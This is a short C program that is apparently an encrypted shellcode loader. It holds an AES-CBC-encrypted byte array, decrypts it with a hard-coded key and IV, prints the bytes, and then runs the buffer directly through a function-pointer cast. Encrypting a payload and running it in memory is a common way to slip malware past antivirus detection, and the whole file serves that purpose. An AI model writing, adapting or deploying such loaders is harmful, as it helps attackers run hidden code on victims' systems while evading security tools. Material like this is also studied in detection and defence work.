#include <stdio.h>
#include <string.h>
#include "aes.h"
#define CBC 1

unsigned char code[] = 
"\x11\xe8\xc6\x6a\x68\x79\x1e\x39\x20\xd9\xde\x1d\xfe\x08\x76\xec\xb4\x11\x2d\x59\xcd\xd8\xca\x5e\x61\x09\xba\xf2\x23\x3b\x44\x1e";

int main()
{
	size_t shellcodeSize = sizeof(code);

	unsigned char key[] = "0123456789abcdef0123456789abcdef";
	unsigned char iv[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10";

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, code, shellcodeSize);

	printf("Decrypted Shellcode: \n");

	for (int i = 0; i < shellcodeSize - 1; i++) {
		printf("\\x%02x", code[i]);
	}

	printf("\n\nExecuting Shellcode...\n");

	int (*ret)() = (int(*)())code;

        ret();
}	
